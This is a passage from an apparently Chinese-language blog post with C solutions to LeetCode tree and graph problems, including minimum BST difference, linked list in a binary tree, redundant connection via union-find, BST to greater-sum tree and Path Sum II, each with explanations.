class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> pre;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">min</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode * root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(pre != <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">min</span> = (root-&gt;val - pre &gt; <span class="built_in">min</span>) ? <span class="built_in">min</span> : (root-&gt;val - pre);</span><br><span class="line">    pre = root-&gt;val;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minDiffInBST</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pre = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0xffff</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/12/ZO73tM64GYXsf1c.png" alt="image.png"></p><h1 id="0x02-难度：中等"><a href="#0x02-难度：中等" class="headerlink" title="0x02.难度：中等"></a>0x02.难度：中等</h1><h2 id="0x00-二叉树中的列表"><a href="#0x00-二叉树中的列表" class="headerlink" title="0x00.二叉树中的列表"></a>0x00.<a href="https://leetcode-cn.com/problems/linked-list-in-binary-tree/" target="_blank" rel="noopener">二叉树中的列表</a></h2><blockquote><p>给你一棵以 <code>root</code> 为根的二叉树和一个 <code>head</code> 为第一个节点的链表。</p><p>如果在二叉树中，存在一条一直向下的路径，且每个点的数值恰好一一对应以 <code>head</code> 为首的链表中每个节点的值，那么请你返回 <code>True</code>，否则返回 <code>False</code> 。</p><p>一直向下的路径的意思是：从树中某个节点开始，一直连续向下的路径。</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/29/sample_1_1720.png" alt=""></p><blockquote><p>输入：head = [4,2,8], root = [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>输出：true<br>解释：树中蓝色的节点构成了与链表对应的子路径。</p></blockquote><p>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/29/sample_2_1720.png" alt=""></p><blockquote><p>输入：head = [1,4,2,6], root = [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>输出：true</p></blockquote><p>示例 3：</p><blockquote><p>输入：head = [1,4,2,6,8], root = [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>输出：false<br>解释：二叉树中不存在一一对应链表的路径。</p></blockquote><p>提示：</p><p>二叉树和链表中的每个节点的值都满足 1 &lt;= node.val &lt;= 100 。<br>链表包含的节点数目在 1 到 100 之间。<br>二叉树包含的节点数目在 1 到 2500 之间。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-in-binary-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/linked-list-in-binary-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这题咋一看很难的样子，其实仔细一想，这不就是我们常用的递归算法中的二叉树的前序遍历🐎，一股熟悉的感觉扑面而来www</p><blockquote><p>前序遍历：先遍历根节点，再遍历左节点，再遍历又节点</p></blockquote><blockquote><p>不熟悉递归算法的可以先看看<a href="https://blog.csdn.net/arttnba3/article/details/102748671" target="_blank" rel="noopener">我以前的博文</a>，然后把<a href="http://noi.openjudge.cn/ch0205/1700/" target="_blank" rel="noopener">OpenJudge.1700:八皇后问题</a>给做了，那么这道题的算法你基本上也就该明白了</p></blockquote><p><strong>思路：递归前序遍历二叉树查找对应的&quot;链表&quot;，找到了直接返回True，遍历完整棵树都没找到则返回False</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">seek</span><span class="params">(struct ListNode* head, struct TreeNode* root)</span><span class="comment">//此函数进行对比</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span>)<span class="comment">//链表遍历完了，直接true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)<span class="comment">//链表没完树先到头肯定是false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;val!=root-&gt;val)<span class="comment">//遍历到一半不一样，肯定是false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">seek</span>(head-&gt;next,root-&gt;left)||<span class="built_in">seek</span>(head-&gt;next,root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isSubPath</span><span class="params">(struct ListNode* head, struct TreeNode* root)</span><span class="comment">//此函数仅用作开始对比的入口</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">seek</span>(head,root)||isSubPath(head,root-&gt;left)||isSubPath(head,root-&gt;right);<span class="comment">//根节点||左孩子做根节点||右孩子做根节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/23/xOrMznpe3V6hmJ5.png" alt="QQ截图20200423032409.png"></p><h2 id="0x01-冗余连接"><a href="#0x01-冗余连接" class="headerlink" title="0x01. 冗余连接"></a>0x01.<a href="https://leetcode-cn.com/problems/redundant-connection/" target="_blank" rel="noopener"> 冗余连接</a></h2><blockquote><p>在本问题中, 树指的是一个连通且无环的无向图。</p><p>输入一个图，该图由一个有着N个节点 (节点值不重复1, 2, …, N) 的树及一条附加的边构成。附加的边的两个顶点包含在1到N中间，这条附加的边不属于树中已存在的边。</p><p>结果图是一个以边组成的二维数组。每一个边的元素是一对[u, v] ，满足 u &lt; v，表示连接顶点u 和v的无向图的边。</p><p>返回一条可以删去的边，使得结果图是一个有着N个节点的树。如果有多个答案，则返回二维数组中最后出现的边。答案边 [u, v] 应满足相同的格式 u &lt; v。</p><p>示例 1：</p><p>输入: [[1,2], [1,3], [2,3]]<br>输出: [2,3]<br>解释: 给定的无向图为:<br>  1<br> / \<br>2 - 3<br>示例 2：</p><p>输入: [[1,2], [2,3], [3,4], [1,4], [1,5]]<br>输出: [1,4]<br>解释: 给定的无向图为:<br>5 - 1 - 2<br>    |     |<br>    4 - 3<br>注意:</p><p>输入的二维数组大小在 3 到 1000。<br>二维数组中的整数在1到N之间，其中N是输入数组的大小。<br>更新(2017-09-26):<br>我们已经重新检查了问题描述及测试用例，明确图是无向 图。对于有向图详见冗余连接II。对于造成任何不便，我们深感歉意。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/redundant-connection" target="_blank" rel="noopener">https://leetcode-cn.com/problems/redundant-connection</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><del>图有的时候是树，树无时无刻是图</del></p><h3 id="解法：并查集"><a href="#解法：并查集" class="headerlink" title="解法：并查集"></a>解法：并查集</h3><p>由于本题所给的是无向图，故不需要考虑边的方向</p><p>考虑<strong>并查集算法</strong>：将所有联通的点都纳入数个集合中以方便查找：</p><ul><li>初始化每个点为一个自身的集合</li><li>逐条边读入，分别查找两端点所属集合</li><li><strong>两点所属集合不同则合并两集合，否则返回该条边即可</strong></li></ul><h3 id="初版代码"><a href="#初版代码" class="headerlink" title="初版代码"></a>初版代码</h3><p>一开始我是这么写的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">set</span>[<span class="number">10000</span>][<span class="number">10000</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//第一维分配给每一个点，第二维作为该点的集合保存其他附庸点</span></span><br><span class="line"><span class="keyword">int</span> set_size[<span class="number">10000</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//0表示所属集合，1表示集合中点的数量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_x</span><span class="params">(<span class="keyword">int</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> set_size[src][<span class="number">0</span>] == src ? src : find_x(set_size[src][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union_set</span><span class="params">(<span class="keyword">int</span> s1, <span class="keyword">int</span> s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">while</span>(set_size[s1][<span class="number">0</span>]!=s1)</span><br><span class="line">        s1 = set_size[s1][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span>(set_size[s2][<span class="number">0</span>]!=s2)</span><br><span class="line">        s2 = set_size[s2][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=set_size[s2][<span class="number">1</span>];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        set_size[s1][<span class="number">1</span>]++;</span><br><span class="line">        <span class="built_in">set</span>[s1][set_size[s1][<span class="number">1</span>]] = <span class="built_in">set</span>[s2][i];</span><br><span class="line">    &#125;</span><br><span class="line">    set_size[s2][<span class="number">0</span>] = s1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">findRedundantConnection</span><span class="params">(<span class="keyword">int</span>** edges, <span class="keyword">int</span> edgesSize, <span class="keyword">int</span>* edgesColSize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> *ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>) * <span class="number">2</span>);</span><br><span class="line">    ret[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ret[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        set_size[i][<span class="number">0</span>] = <span class="built_in">set</span>[i][<span class="number">0</span>] = i;</span><br><span class="line">        set_size[i][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> start, <span class="built_in">end</span>;</span><br><span class="line">    <span class="keyword">int</span> flag1,flag2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">end</span> = edges[i][<span class="number">1</span>];</span><br><span class="line">        flag1 = find_x(start);</span><br><span class="line">        flag2 = find_x(<span class="built_in">end</span>);</span><br><span class="line">        <span class="keyword">if</span>(flag1 == flag2)</span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = start;</span><br><span class="line">            ret[<span class="number">1</span>] = <span class="built_in">end</span>;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        union_set(start,<span class="built_in">end</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于一开始我们就初始化一个较大的二维数组，故空间复杂度上比较吃亏</p><p><img src="https://i.loli.net/2020/09/17/3VoQgCI1NvSJ7wt.png" alt="image.png"></p><h3 id="优化：减少冗余步骤与空间"><a href="#优化：减少冗余步骤与空间" class="headerlink" title="优化：减少冗余步骤与空间"></a>优化：减少冗余步骤与空间</h3><p>我们尝试改变之前一拍脑门时繁复冗杂的写法，在归并时仅记录长度进行归并即可（即小集合归并到大集合），并使用动态数组以尽量减少空间使用</p><p>思路还是合之前的一样，构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> *<span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">int</span> *set_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_x</span><span class="params">(<span class="keyword">int</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>[src] == src ? src : find_x(<span class="built_in">set</span>[src]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union_set</span><span class="params">(<span class="keyword">int</span> s1, <span class="keyword">int</span> s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    s1 = find_x(s1);</span><br><span class="line">    s2 = find_x(s2);</span><br><span class="line">    <span class="keyword">if</span>(set_size[s1]&lt;set_size[s2])</span><br><span class="line">    &#123;</span><br><span class="line">        set_size[s2] += set_size[s1];</span><br><span class="line">        <span class="built_in">set</span>[s1] = <span class="built_in">set</span>[s2];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        set_size[s1] += set_size[s2];</span><br><span class="line">        <span class="built_in">set</span>[s2] = <span class="built_in">set</span>[s1];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">findRedundantConnection</span><span class="params">(<span class="keyword">int</span>** edges, <span class="keyword">int</span> edgesSize, <span class="keyword">int</span>* edgesColSize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> *ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">set</span> = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    set_size = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    ret[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ret[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">set</span>[i] = i;</span><br><span class="line">        set_size[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> start, <span class="built_in">end</span>;</span><br><span class="line">    <span class="keyword">int</span> flag1,flag2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">end</span> = edges[i][<span class="number">1</span>];</span><br><span class="line">        flag1 = find_x(start);</span><br><span class="line">        flag2 = find_x(<span class="built_in">end</span>);</span><br><span class="line">        <span class="keyword">if</span>(flag1 == flag2)</span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = start;</span><br><span class="line">            ret[<span class="number">1</span>] = <span class="built_in">end</span>;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        union_set(start,<span class="built_in">end</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（减少差不多一半空间，<del>但是看起来并没有什么用</del>…）</p><p><img src="https://i.loli.net/2020/09/17/Hsxip4fmnoXAyvC.png" alt="image.png"></p><h2 id="0x02-从二叉搜索树到更大和树"><a href="#0x02-从二叉搜索树到更大和树" class="headerlink" title="0x02.从二叉搜索树到更大和树"></a>0x02.<a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/" target="_blank" rel="noopener">从二叉搜索树到更大和树</a></h2><blockquote><p>给出二叉 搜索 树的根节点，该二叉树的节点值各不相同，修改二叉树，使每个节点 node 的新值等于原树中大于或等于 node.val 的值之和。</p><p>提醒一下，二叉搜索树满足下列约束条件：</p><p>节点的左子树仅包含键 小于 节点键的节点。<br>节点的右子树仅包含键 大于 节点键的节点。<br>左右子树也必须是二叉搜索树。</p><p>示例：</p><p><img src="https://i.loli.net/2020/09/21/RaA7r8BHmc9K2yX.png" alt="image.png"></p><p>输入：[4,1,6,0,2,5,7,null,null,null,3,null,null,null,8]<br>输出：[30,36,21,36,35,26,15,null,null,null,33,null,null,null,8]</p><p>提示：</p><p>树中的节点数介于 1 和 100 之间。<br>每个节点的值介于 0 和 100 之间。<br>给定的树为二叉搜索树。</p><p>注意：该题目与 538: <a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/convert-bst-to-greater-tree/</a>  相同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这道题和上面<strong>【难度：简单】0x03.把二叉搜索树转换为累加树</strong>是<strong>一模一样的</strong>（<del>所以说为什么换一个名字难度就变成中等了啊</del></p><p><strong>二叉搜索树</strong>有一个特点就是<strong>结点左子树的结点都比该结点小，右子树的结点都比该结点大</strong>，因而叫二叉搜索树，可以用以大幅缩短搜索的时间</p><h3 id="解法：深度优先搜索-反序中序遍历-1"><a href="#解法：深度优先搜索-反序中序遍历-1" class="headerlink" title="解法：深度优先搜索 + 反序中序遍历"></a>解法：深度优先搜索 + 反序中序遍历</h3><p>由于二叉查找树的这个特性，我们考虑<strong>递归实现的深度优先搜索</strong>算法，通过<strong>反序中序遍历</strong>来实现，过程如下：</p><ul><li><strong>遍历右子树，将右子树结点值加到summary</strong></li><li><strong>将当前结点值加到summary</strong></li><li><strong>将当前结点值置为summary</strong></li><li><strong>遍历左子树</strong></li></ul><p>每个结点需要一个额外的栈空间，因而空间复杂度为<strong>O</strong>(<strong>N</strong>)；需要遍历每个结点一次，因而时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">    sum+=root-&gt;val;</span><br><span class="line">    root-&gt;val=sum;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">bstToGst</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/hx5F6qdKp2tzr7D.png" alt="image.png"></p><h2 id="0x03-路径总和-II"><a href="#0x03-路径总和-II" class="headerlink" title="0x03.路径总和 II"></a>0x03.<a href="https://leetcode-cn.com/problems/path-sum-ii/" target="_blank" rel="noopener">路径总和 II</a></h2><blockquote><p>给定一个二叉树和一个目标和，找到所有从根节点到叶子节点路径总和等于给定目标和的路径。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例:<br>给定如下二叉树，以及目标和 sum = 22，</p><pre><code>    5   / \  4   8 /   / \11  13  4</code></pre><p>   /  \    / <br>   7    2  5   1</p><p>返回:</p><p>[<br>[5,4,11,2],<br>[5,8,4,5]<br>]</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/path-sum-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/path-sum-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：深度优先搜索（DFS）-递归中序遍历"><a href="#解法：深度优先搜索（DFS）-递归中序遍历" class="headerlink" title="解法：深度优先搜索（DFS）+ 递归中序遍历"></a>解法：深度优先搜索（DFS）+ 递归中序遍历</h3><p>中序遍历，一层一层地搜下去就完事了，用一个栈来保存路径，遇到叶子结点且刚好到了这一层时sum已经被减到0了就保存路径</p><p>需要注意的是<strong>在每一层搜索结束后都要将该层结点弹出栈</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> **retn;</span><br><span class="line"><span class="keyword">int</span> *<span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">int</span> nums;</span><br><span class="line"><span class="keyword">int</span> retn_nums;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> sum, <span class="keyword">int</span>** returnColumnSizes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    sum -= root-&gt;val;</span><br><span class="line">    <span class="built_in">set</span>[nums++] = root-&gt;val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right &amp;&amp; !sum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> * path = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span 